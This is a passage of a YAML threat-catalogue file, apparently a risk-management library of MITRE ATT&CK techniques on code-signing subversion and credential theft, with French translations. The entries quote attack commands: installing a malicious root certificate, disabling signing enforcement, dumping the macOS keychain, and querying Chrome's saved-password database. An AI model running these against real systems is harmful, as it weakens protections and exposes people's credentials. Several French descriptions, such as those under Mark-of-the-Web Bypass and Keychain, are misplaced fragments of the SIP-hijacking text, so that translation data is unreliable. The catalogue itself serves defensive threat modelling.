      \ Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\\
      OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point\
      \ to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function,\
      \ which validates a file\u2019s computed hash against the signed hash value.\
      \ By pointing to a maliciously-crafted DLL with an exported function that always\
      \ returns TRUE (indicating that the validation was successful), an adversary\
      \ can successfully validate any file (with a legitimate signature) using that\
      \ SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously\
      \ mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could\
      \ also be redirected to a suitable exported function from an already present\
      \ DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying\
      \ the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\\
      SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\\
      {trust provider GUID}</code> that point to the DLL providing a trust provider\u2019\
      s FinalPolicy function, which is where the decoded and parsed signature is checked\
      \ and the majority of trust decisions are made. Similar to hijacking SIP\u2019\
      s CryptSIPDllVerifyIndirectData function, this value can be redirected to a\
      \ suitable exported function from an already present DLL or a maliciously-crafted\
      \ DLL (though the implementation of a trust provider is complex).\n* **Note:**\
      \ The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001)\
      \ search order hijacking.\n\nHijacking SIP or trust provider components can\
      \ also enable persistent code execution, since these malicious components may\
      \ be invoked by any application that performs code signing or signature validation.\
      \ (Citation: SpectorOps Subverting Trust Sept 2017)\nhttps://attack.mitre.org/techniques/T1553/003"
    translations:
      fr:
        name: "D\xE9tournement de fournisseurs de SIP et de fiducie"
        description: "Des attaquants pourraient alt\xE9rer les composants SIP et du\
          \ fournisseur de confiance afin de tromper le syst\xE8me d'exploitation\
          \ et les outils de contr\xF4le des applications lors des v\xE9rifications\
          \ de validation des signatures. En mode utilisateur, les signatures num\xE9\
          riques Windows Authenticode (R\xE9f\xE9rence : Microsoft Authenticode) sont\
          \ utilis\xE9es pour v\xE9rifier l'origine et l'int\xE9grit\xE9 d'un fichier,\
          \ deux crit\xE8res pouvant servir \xE0 \xE9tablir la confiance dans un code\
          \ sign\xE9 (par exemple : un pilote dot\xE9 d'une signature Microsoft valide\
          \ peut \xEAtre consid\xE9r\xE9 comme s\xFBr). Le processus de validation\
          \ de la signature est g\xE9r\xE9 via la fonction de l\u2019interface de\
          \ programmation d\u2019applications (API) WinVerifyTrust (R\xE9f\xE9rence\
          \ : Microsoft WinVerifyTrust), qui accepte une requ\xEAte et coordonne l\u2019\
          action avec le fournisseur de confiance appropri\xE9, charg\xE9 de valider\
          \ les param\xE8tres d\u2019une signature. (R\xE9f\xE9rence : SpectorOps\
          \ Subverting Trust, septembre 2017)\n\nEn raison de la diversit\xE9 des\
          \ types de fichiers ex\xE9cutables et des formats de signature correspondants,\
          \ Microsoft a cr\xE9\xE9 des composants logiciels appel\xE9s \xAB Subject\
          \ Interface Packages \xBB (SIP) (R\xE9f\xE9rence : EduardosBlog SIPs, juillet\
          \ 2008) afin de fournir une couche d\u2019abstraction entre les fonctions\
          \ API et les fichiers. Les SIP permettent aux fonctions API de cr\xE9er,\
          \ r\xE9cup\xE9rer, calculer et v\xE9rifier les signatures. Il existe des\
          \ SIP sp\xE9cifiques pour la plupart des formats de fichiers (ex\xE9cutables,\
          \ PowerShell, programmes d\u2019installation, etc., la signature de catalogue\
          \ servant de solution fourre-tout (R\xE9f\xE9rence : Microsoft, \xAB Catalog\
          \ Files and Signatures \xBB, avril 2017)) et ils sont identifi\xE9s par\
          \ des identifiants uniques globaux (GUID). (R\xE9f\xE9rence : SpectorOps,\
          \ \xAB Subverting Trust \xBB, septembre 2017)\n\n\xC0 l\u2019instar de la\
          \ [signature de code](https://attack.mitre.org/techniques/T1553/002), les\
          \ attaquants peuvent exploiter cette architecture pour contourner les contr\xF4\
          les de confiance et les politiques de s\xE9curit\xE9 qui n\u2019autorisent\
          \ l\u2019ex\xE9cution sur un syst\xE8me que de code l\xE9gitimement sign\xE9\
          . Ils peuvent d\xE9tourner les composants du SIP et des fournisseurs de\
          \ confiance afin de tromper les outils de contr\xF4le du syst\xE8me d\u2019\
          exploitation et des applications, et les amener \xE0 classer du code malveillant\
          \ (ou n\u2019importe quel code) comme \xE9tant sign\xE9 par : (R\xE9f\xE9\
          rence : SpectorOps Subverting Trust, septembre 2017)\n\n* En modifiant les\
          \ valeurs de registre <code>Dll</code> et <code>FuncName</code> dans <code>HKLM\\\
          SOFTWARE[\\WOW6432Node\\] Microsoft\\Cryptography\\OID\\EncodingType 0\\\
          CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> qui pointent vers la biblioth\xE8\
          que de liens dynamiques (DLL) fournissant la fonction CryptSIPDllGetSignedDataMsg\
          \ d\u2019un SIP, laquelle r\xE9cup\xE8re un certificat num\xE9rique encod\xE9\
          \ \xE0 partir d\u2019un fichier sign\xE9. En pointant vers une DLL sp\xE9\
          cialement con\xE7ue avec une fonction export\xE9e qui renvoie syst\xE9matiquement\
          \ une valeur de signature valide connue (par exemple : une signature Microsoft\
          \ pour les ex\xE9cutables portables) plut\xF4t que la v\xE9ritable signature\
          \ du fichier, un attaquant peut appliquer une valeur de signature acceptable\
          \ \xE0 tous les fichiers utilisant ce SIP (R\xE9f\xE9rence : GitHub SIP\
          \ POC septembre 2017) (bien qu\u2019une divergence de hachage soit susceptible\
          \ de se produire, invalidant ainsi la signature, puisque le hachage renvoy\xE9\
          \ par la fonction ne correspondra pas \xE0 la valeur calcul\xE9e \xE0 partir\
          \ du fichier).\n* En modifiant les valeurs de registre <code>Dll</code>\
          \ et <code>FuncName</code> dans <code>HKLM\\SOFTWARE\\[WOW6432Node\\] Microsoft\\\
          Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>\
          \ qui pointent vers la DLL fournissant la fonction CryptSIPDllVerifyIndirectData\
          \ d\u2019un SIP, laquelle valide le hachage calcul\xE9 d\u2019un fichier\
          \ par rapport \xE0 la valeur de hachage sign\xE9e. En pointant vers une\
          \ DLL con\xE7ue de mani\xE8re malveillante et comportant une fonction export\xE9\
          e qui renvoie toujours TRUE (indiquant que la validation a r\xE9ussi), un\
          \ attaquant peut valider avec succ\xE8s n\u2019importe quel fichier (dot\xE9\
          \ d\u2019une signature l\xE9gitime) \xE0 l\u2019aide de ce SIP (R\xE9f\xE9\
          rence : GitHub SIP POC septembre 2017) (avec ou sans d\xE9tournement de\
          \ la fonction CryptSIPDllGetSignedDataMsg mentionn\xE9e pr\xE9c\xE9demment).\
          \ Cette valeur de registre pourrait \xE9galement \xEAtre redirig\xE9e vers\
          \ une fonction export\xE9e appropri\xE9e d\u2019une DLL d\xE9j\xE0 pr\xE9\
          sente, \xE9vitant ainsi d\u2019avoir \xE0 d\xE9poser et \xE0 ex\xE9cuter\
          \ un nouveau fichier sur le disque.\n* La modification des valeurs de registre\
          \ <code>DLL</code> et <code>Function</code> dans <code>HKLM\\SOFTWARE\\\
          [WOW6432Node\\] Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\\
          {GUID du fournisseur de confiance}</code> qui pointent vers la DLL fournissant\
          \ la fonction FinalPolicy d\u2019un fournisseur de confiance, o\xF9 la signature\
          \ d\xE9cod\xE9e et analys\xE9e est v\xE9rifi\xE9e et o\xF9 la plupart des\
          \ d\xE9cisions de confiance sont prises. \xC0 l\u2019instar du d\xE9tournement\
          \ de la fonction CryptSIPDllVerifyIndirectData de SIP, cette valeur peut\
          \ \xEAtre redirig\xE9e vers une fonction export\xE9e appropri\xE9e provenant\
          \ d\u2019une DLL d\xE9j\xE0 pr\xE9sente ou d\u2019une DLL con\xE7ue de mani\xE8\
          re malveillante (bien que la mise en \u0153uvre d\u2019un fournisseur de\
          \ confiance soit complexe).\n* **Remarque :** Les d\xE9tournements mentionn\xE9\
          s ci-dessus sont \xE9galement possibles sans modifier le Registre, en d\xE9\
          tournant l'ordre de recherche des [DLL](https://attack.mitre.org/techniques/T1574/001).\n\
          \nLe d\xE9tournement des composants SIP ou des fournisseurs de confiance\
          \ peut \xE9galement permettre l'ex\xE9cution persistante de code, car ces\
          \ composants malveillants peuvent \xEAtre invoqu\xE9s par n'importe quelle\
          \ application effectuant la signature de code ou la validation de signature.\
          \ (R\xE9f\xE9rence : SpectorOps Subverting Trust, septembre 2017)\nhttps://attack.mitre.org/techniques/T1553/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.004
    ref_id: T1553.004
    name: Install Root Certificate
    description: 'Adversaries may install a root certificate on a compromised system
      to avoid warnings when connecting to adversary controlled web servers. Root
      certificates are used in public key cryptography to identify a root certificate
      authority (CA). When a root certificate is installed, the system or application
      will trust certificates in the root''s chain of trust that have been signed
      by the root certificate.(Citation: Wikipedia Root Certificate) Certificates
      are commonly used for establishing secure TLS/SSL communications within a web
      browser. When a user attempts to browse a website that presents a certificate
      that is not trusted an error message will be displayed to warn the user of the
      security risk. Depending on the security settings, the browser may not allow
      the user to establish a connection to the website.


      Installation of a root certificate on a compromised system would give an adversary
      a way to degrade the security of that system. Adversaries have used this technique
      to avoid security warnings prompting users when compromised systems connect
      over HTTPS to adversary controlled web servers that spoof legitimate websites
      in order to collect login credentials.(Citation: Operation Emmental)


      Atypical root certificates have also been pre-installed on systems by the manufacturer
      or in the software supply chain and were used in conjunction with malware/adware
      to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      capability for intercepting information transmitted over secure TLS/SSL communications.(Citation:
      Kaspersky Superfish)


      Root certificates (and their associated chains) can also be cloned and reinstalled.
      Cloned certificate chains will carry many of the same metadata characteristics
      of the source and can be used to sign malicious code that may then bypass signature
      validation tools (ex: Sysinternals, antivirus, etc.) used to block execution
      and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec
      2017)


      In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert
      -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>
      to install a malicious certificate as a trusted root certificate into the system
      keychain.(Citation: objective-see ay mami 2018)

      https://attack.mitre.org/techniques/T1553/004'
    translations:
      fr:
        name: "Certificat racine d\u2019installation"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.005
    ref_id: T1553.005
    name: Mark-of-the-Web Bypass
    description: 'Adversaries may abuse specific file formats to subvert Mark-of-the-Web
      (MOTW) controls. In Windows, when files are downloaded from the Internet, they
      are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code>
      with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier
      2020) Files that are tagged with MOTW are protected and cannot perform certain
      actions. For example, starting in MS Office 10, if a MS Office file has the
      MOTW, it will open in Protected View. Executables tagged with the MOTW will
      be processed by Windows Defender SmartScreen that compares files with an allowlist
      of well-known executables. If the file is not known/trusted, SmartScreen will
      prevent the execution and warn the user not to run it.(Citation: Beek Use of
      VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec
      2020)


      Adversaries may abuse container files such as compressed/archive (.arj, .gzip)
      and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that
      may not be tagged with MOTW. Container files downloaded from the Internet will
      be marked with MOTW but the files within may not inherit the MOTW after the
      container files are extracted and/or mounted. MOTW is a NTFS feature and many
      container files do not support NTFS alternative data streams. After a container
      file is extracted and/or mounted, the files contained within them may be treated
      as local files on disk and run without protections.(Citation: Beek Use of VHD
      Dec 2020)(Citation: Outflank MotW 2020)

      https://attack.mitre.org/techniques/T1553/005'
    translations:
      fr:
        name: Contournement Mark-of-the-Web
        description: "En raison de la diversit\xE9 des types de fichiers ex\xE9cutables\
          \ et des formats de signature correspondants, Microsoft a cr\xE9\xE9 des\
          \ composants logiciels appel\xE9s \xAB Subject Interface Packages \xBB (SIP)\
          \ (R\xE9f\xE9rence : EduardosBlog SIPs, juillet 2008) afin de fournir une\
          \ couche d\u2019abstraction entre les fonctions API et les fichiers. Les\
          \ SIP permettent aux fonctions API de cr\xE9er, r\xE9cup\xE9rer, calculer\
          \ et v\xE9rifier les signatures. Il existe des SIP sp\xE9cifiques pour la\
          \ plupart des formats de fichiers (ex\xE9cutables, PowerShell, programmes\
          \ d\u2019installation, etc., la signature de catalogue servant de solution\
          \ fourre-tout (R\xE9f\xE9rence : Microsoft, \xAB Catalog Files and Signatures\
          \ \xBB, avril 2017)) et ils sont identifi\xE9s par des identifiants uniques\
          \ globaux (GUID). (R\xE9f\xE9rence : SpectorOps, \xAB Subverting Trust \xBB\
          , septembre 2017)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.006
    ref_id: T1553.006
    name: Code Signing Policy Modification
    description: "Adversaries may modify code signing policies to enable execution\
      \ of unsigned or self-signed code. Code signing provides a level of authenticity\
      \ on a program from a developer and a guarantee that the program has not been\
      \ tampered with. Security controls can include enforcement mechanisms to ensure\
      \ that only valid, signed code can be run on an operating system. \n\nSome of\
      \ these security controls may be enabled by default, such as Driver Signature\
      \ Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation:\
      \ Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls\
      \ may be disabled by default but are configurable through application controls,\
      \ such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a\
      \ system. Since it can be useful for developers to modify default signature\
      \ enforcement policies during the development and testing of applications, disabling\
      \ of these features may be possible with elevated permissions.(Citation: Microsoft\
      \ Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may\
      \ modify code signing policies in a number of ways, including through use of\
      \ command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112),\
      \ rebooting the computer in a debug/recovery mode, or by altering the value\
      \ of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation:\
      \ Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub\
      \ Turla Driver Loader) Examples of commands that can modify the code signing\
      \ policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on\
      \ Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING\
      \ Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful\
      \ modification of a signing policy may require reboot of the compromised system.\
      \ Additionally, some implementations can introduce visible artifacts for the\
      \ user (ex: a watermark in the corner of the screen stating the system is in\
      \ Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure\
      \ BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related\
      \ to signature checks, such as modifying <code>g_CiOptions</code> to disable\
      \ Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but\
      \ vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla\
      \ Driver Loader)\nhttps://attack.mitre.org/techniques/T1553/006"
    translations:
      fr:
        name: Modification de la politique de signature de code
  - urn: urn:intuitem:risk:threat:mitre-attack:t1554
    ref_id: T1554
    name: Compromise Host Software Binary
    description: "Adversaries may modify host software binaries to establish persistent\
      \ access to systems. Software binaries/executables provide a wide range of system\
      \ commands or services, programs, and libraries. Common software binaries are\
      \ SSH clients, FTP clients, email clients, web browsers, and many other user\
      \ or server applications.\n\nAdversaries may establish persistence though modifications\
      \ to host software binaries. For example, an adversary may replace or otherwise\
      \ infect a legitimate application binary (or support files) with a backdoor.\
      \ Since these binaries may be routinely executed by applications or the user,\
      \ the adversary can leverage this for persistent access to the host. An adversary\
      \ may also modify a software binary such as an SSH client in order to persistently\
      \ collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation:\
      \ Google Cloud Mandiant UNC3886 2024)\n\nAn adversary may also modify an existing\
      \ binary by patching in malicious functionality (e.g., IAT Hooking/Entry point\
      \ patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary\u2019\
      s legitimate execution. For example, an adversary may modify the entry point\
      \ of a binary to point to malicious code patched in by the adversary before\
      \ resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)\n\
      \nAfter modifying a binary, an adversary may attempt to impair defenses by preventing\
      \ it from updating (e.g., via the `yum-versionlock` command or `versionlock.list`\
      \ file in Linux systems that use the yum package manager).(Citation: Google\
      \ Cloud Mandiant UNC3886 2024)\nhttps://attack.mitre.org/techniques/T1554"
    translations:
      fr:
        name: "Compromis du logiciel h\xF4te binaire"
        description: "\xC0 l\u2019instar de la [signature de code](https://attack.mitre.org/techniques/T1553/002),\
          \ les attaquants peuvent exploiter cette architecture pour contourner les\
          \ contr\xF4les de confiance et les politiques de s\xE9curit\xE9 qui n\u2019\
          autorisent l\u2019ex\xE9cution sur un syst\xE8me que de code l\xE9gitimement\
          \ sign\xE9. Ils peuvent d\xE9tourner les composants du SIP et des fournisseurs\
          \ de confiance afin de tromper les outils de contr\xF4le du syst\xE8me d\u2019\
          exploitation et des applications, et les amener \xE0 classer du code malveillant\
          \ (ou n\u2019importe quel code) comme \xE9tant sign\xE9 par : (R\xE9f\xE9\
          rence : SpectorOps Subverting Trust, septembre 2017)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555
    ref_id: T1555
    name: Credentials from Password Stores
    description: 'Adversaries may search for common password storage locations to
      obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored
      in several places on a system, depending on the operating system or application
      holding the credentials. There are also specific applications and services that
      store passwords to make them easier for users to manage and maintain, such as
      password managers and cloud secrets vaults. Once credentials are obtained, they
      can be used to perform lateral movement and access restricted information.

      https://attack.mitre.org/techniques/T1555'
    translations:
      fr:
        name: Identifiants issus des magasins de mots de passe
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.001
    ref_id: T1555.001
    name: Keychain
    description: "Adversaries may acquire credentials from Keychain. Keychain (or\
      \ Keychain Services) is the macOS credential management system that stores account\
      \ names, passwords, private keys, certificates, sensitive application data,\
      \ payment data, and secure notes. There are three types of Keychains: Login\
      \ Keychain, System Keychain, and Local Items (iCloud) Keychain. The default\
      \ Keychain is the Login Keychain, which stores user passwords and information.\
      \ The System Keychain stores items accessed by the operating system, such as\
      \ items shared among users on a host. The Local Items (iCloud) Keychain is used\
      \ for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed\
      \ and edited through the Keychain Access application or using the command-line\
      \ utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>,\
      \ <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation:\
      \ Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation:\
      \ OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain\
      \ storage/memory. For example, the command <code>security dump-keychain \u2013\
      d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>.\
      \ Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code>\
      \ file. Both methods require a password, where the default password for the\
      \ Login Keychain is the current user\u2019s password to login to the macOS host.(Citation:\
      \ External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)\nhttps://attack.mitre.org/techniques/T1555/001"
    translations:
      fr:
        name: "Porte-cl\xE9s"
        description: "* En modifiant les valeurs de registre <code>Dll</code> et <code>FuncName</code>\
          \ dans <code>HKLM\\SOFTWARE[\\WOW6432Node\\] Microsoft\\Cryptography\\OID\\\
          EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> qui pointent\
          \ vers la biblioth\xE8que de liens dynamiques (DLL) fournissant la fonction\
          \ CryptSIPDllGetSignedDataMsg d\u2019un SIP, laquelle r\xE9cup\xE8re un\
          \ certificat num\xE9rique encod\xE9 \xE0 partir d\u2019un fichier sign\xE9\
          . En pointant vers une DLL sp\xE9cialement con\xE7ue avec une fonction export\xE9\
          e qui renvoie syst\xE9matiquement une valeur de signature valide connue\
          \ (par exemple : une signature Microsoft pour les ex\xE9cutables portables)\
          \ plut\xF4t que la v\xE9ritable signature du fichier, un attaquant peut\
          \ appliquer une valeur de signature acceptable \xE0 tous les fichiers utilisant\
          \ ce SIP (R\xE9f\xE9rence : GitHub SIP POC septembre 2017) (bien qu\u2019\
          une divergence de hachage soit susceptible de se produire, invalidant ainsi\
          \ la signature, puisque le hachage renvoy\xE9 par la fonction ne correspondra\
          \ pas \xE0 la valeur calcul\xE9e \xE0 partir du fichier)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.002
    ref_id: T1555.002
    name: Securityd Memory
    description: "An adversary with root access may gather credentials by reading\
      \ `securityd`\u2019s memory. `securityd` is a service/daemon responsible for\
      \ implementing security protocols such as encryption and authorization.(Citation:\
      \ Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s\
      \ memory to find the correct sequence of keys to decrypt the user\u2019s logon\
      \ keychain. This may provide the adversary with various plaintext passwords,\
      \ such as those for users, WiFi, mail, browsers, certificates, secure notes,\
      \ etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior\
      \ to El Capitan, users with root access can read plaintext keychain passwords\
      \ of logged-in users because Apple\u2019s keychain implementation allows these\
      \ credentials to be cached so that users are not repeatedly prompted for passwords.(Citation:\
      \ OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd`\
      \ utility takes the user\u2019s logon password, encrypts it with PBKDF2, and\
      \ stores this master key in memory. Apple also uses a set of keys and algorithms\
      \ to encrypt the user\u2019s password, but once the master key is found, an\
      \ adversary need only iterate over the other values to unlock the final password.(Citation:\
      \ OS X Keychain)\nhttps://attack.mitre.org/techniques/T1555/002"
    translations:
      fr:
        name: "M\xE9moire s\xE9curis\xE9e"
        description: "* En modifiant les valeurs de registre <code>Dll</code> et <code>FuncName</code>\
          \ dans <code>HKLM\\SOFTWARE\\[WOW6432Node\\] Microsoft\\Cryptography\\OID\\\
          EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> qui pointent\
          \ vers la DLL fournissant la fonction CryptSIPDllVerifyIndirectData d\u2019\
          un SIP, laquelle valide le hachage calcul\xE9 d\u2019un fichier par rapport\
          \ \xE0 la valeur de hachage sign\xE9e. En pointant vers une DLL con\xE7\
          ue de mani\xE8re malveillante et comportant une fonction export\xE9e qui\
          \ renvoie toujours TRUE (indiquant que la validation a r\xE9ussi), un attaquant\
          \ peut valider avec succ\xE8s n\u2019importe quel fichier (dot\xE9 d\u2019\
          une signature l\xE9gitime) \xE0 l\u2019aide de ce SIP (R\xE9f\xE9rence :\
          \ GitHub SIP POC septembre 2017) (avec ou sans d\xE9tournement de la fonction\
          \ CryptSIPDllGetSignedDataMsg mentionn\xE9e pr\xE9c\xE9demment). Cette valeur\
          \ de registre pourrait \xE9galement \xEAtre redirig\xE9e vers une fonction\
          \ export\xE9e appropri\xE9e d\u2019une DLL d\xE9j\xE0 pr\xE9sente, \xE9\
          vitant ainsi d\u2019avoir \xE0 d\xE9poser et \xE0 ex\xE9cuter un nouveau\
          \ fichier sur le disque."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.003
    ref_id: T1555.003
    name: Credentials from Web Browsers
    description: "Adversaries may acquire credentials from web browsers by reading\
      \ files specific to the target browser.(Citation: Talos Olympic Destroyer 2018)\
      \ Web browsers commonly save credentials such as website usernames and passwords\
      \ so that they do not need to be entered manually in the future. Web browsers\
      \ typically store the credentials in an encrypted format within a credential\
      \ store; however, methods exist to extract plaintext credentials from web browsers.\n\
      \nFor example, on Windows systems, encrypted credentials may be obtained from\
      \ Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\\
      User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT\
      \ action_url, username_value, password_value FROM logins;</code>. The plaintext\
      \ password can then be obtained by passing the encrypted credentials to the\
      \ Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019\
      s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData\
      \ April 2018)\n \nAdversaries have executed similar procedures for common web\
      \ browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential\
      \ Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores\
      \ Internet Explorer and Microsoft Edge credentials in Credential Lockers managed\
      \ by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\
      \nAdversaries may also acquire credentials by searching web browser process\
      \ memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz\
      \ July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may\
      \ attempt to recycle the credentials across different systems and/or accounts\
      \ in order to expand access. This can result in significantly furthering an\
      \ adversary's objective in cases where credentials gained from web browsers\
      \ overlap with privileged accounts (e.g. domain administrator).\nhttps://attack.mitre.org/techniques/T1555/003"
    translations:
      fr:
        name: Identifiants issus des navigateurs Web
        description: "* La modification des valeurs de registre <code>DLL</code> et\
          \ <code>Function</code> dans <code>HKLM\\SOFTWARE\\[WOW6432Node\\] Microsoft\\\
          Cryptography\\Providers\\Trust\\FinalPolicy\\{GUID du fournisseur de confiance}</code>\
          \ qui pointent vers la DLL fournissant la fonction FinalPolicy d\u2019un\
          \ fournisseur de confiance, o\xF9 la signature d\xE9cod\xE9e et analys\xE9\
          e est v\xE9rifi\xE9e et o\xF9 la plupart des d\xE9cisions de confiance sont\
          \ prises. \xC0 l\u2019instar du d\xE9tournement de la fonction CryptSIPDllVerifyIndirectData\
          \ de SIP, cette valeur peut \xEAtre redirig\xE9e vers une fonction export\xE9\
          e appropri\xE9e provenant d\u2019une DLL d\xE9j\xE0 pr\xE9sente ou d\u2019\
          une DLL con\xE7ue de mani\xE8re malveillante (bien que la mise en \u0153\
          uvre d\u2019un fournisseur de confiance soit complexe)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.004
    ref_id: T1555.004
    name: Windows Credential Manager
    description: "Adversaries may acquire credentials from the Windows Credential\
      \ Manager. The Credential Manager stores credentials for signing into websites,\
      \ applications, and/or devices that request authentication through NTLM or Kerberos\
      \ in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft\
      \ Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows\
      \ Credential Manager separates website credentials from application or network\
      \ credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003),\
      \ Internet Explorer and Microsoft Edge website credentials are managed by the\
      \ Credential Manager and are stored in the Web Credentials locker. Application\
      \ and network credentials are stored in the Windows Credentials locker.\n\n\
      Credential Lockers store credentials in encrypted `.vcrd` files, located under\
      \ `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\\
      `. The encryption key can be found in a file named <code>Policy.vpol</code>,\
      \ typically located in the same folder as the credentials.(Citation: passcape\
      \ Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may\
      \ list credentials managed by the Windows Credential Manager through several\
      \ mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that\
      \ can be used to enumerate credentials stored in the Credential Locker through\
      \ a command-line interface. Adversaries may also gather credentials by directly\
      \ reading files located inside of the Credential Lockers. Windows APIs, such\
      \ as <code>CredEnumerateA</code>, may also be absued to list credentials managed\
      \ by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy\
      \ Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from\
      \ credential backups. Credential backups and restorations may be performed by\
      \ running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the\
      \ \u201CBack up...\u201D button on the \u201CStored User Names and Passwords\u201D\
      \ GUI.\n\nPassword recovery tools may also obtain plain text passwords from\
      \ the Credential Manager.(Citation: Malwarebytes The Windows Vault)\nhttps://attack.mitre.org/techniques/T1555/004"
    translations:
      fr:
        name: "Gestionnaire d\u2019accr\xE9ditations Windows"
        description: "* **Remarque :** Les d\xE9tournements mentionn\xE9s ci-dessus\
          \ sont \xE9galement possibles sans modifier le Registre, en d\xE9tournant\
          \ l'ordre de recherche des [DLL](https://attack.mitre.org/techniques/T1574/001)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.005
    ref_id: T1555.005
    name: Password Managers
    description: "Adversaries may acquire user credentials from third-party password\
      \ managers.(Citation: ise Password Manager February 2019) Password managers\
      \ are applications designed to store user credentials, normally in an encrypted\
      \ database. Credentials are typically accessible after a user provides a master\
      \ password that unlocks the database. After the database is unlocked, these\
      \ credentials may be copied to memory. These databases can be stored as files\
      \ on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may\
      \ acquire user credentials from password managers by extracting the master password\
      \ and/or plain-text credentials from memory.(Citation: FoxIT Wocao December\
      \ 2019)(Citation: Github KeeThief) Adversaries may extract credentials from\
      \ memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation:\
      \ NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password\
      \ Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master\
      \ password of a password manager.(Citation: Cyberreason Anchor December 2019)\n\
      https://attack.mitre.org/techniques/T1555/005"
    translations:
      fr:
        name: Gestionnaires de mots de passe
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.006
    ref_id: T1555.006
    name: Cloud Secrets Management Stores
    description: "Adversaries may acquire credentials from cloud-native secret management\
      \ solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault,\
      \ and Terraform Vault.  \n\nSecrets managers support the secure centralized\
      \ management of passwords, API keys, and other credential material. Where secrets\
      \ managers are in use, cloud services can dynamically acquire credentials via\
      \ API requests rather than accessing secrets insecurely stored in plain text\
      \ files or environment variables.  \n\nIf an adversary is able to gain sufficient\
      \ privileges in a cloud environment \u2013 for example, by obtaining the credentials\
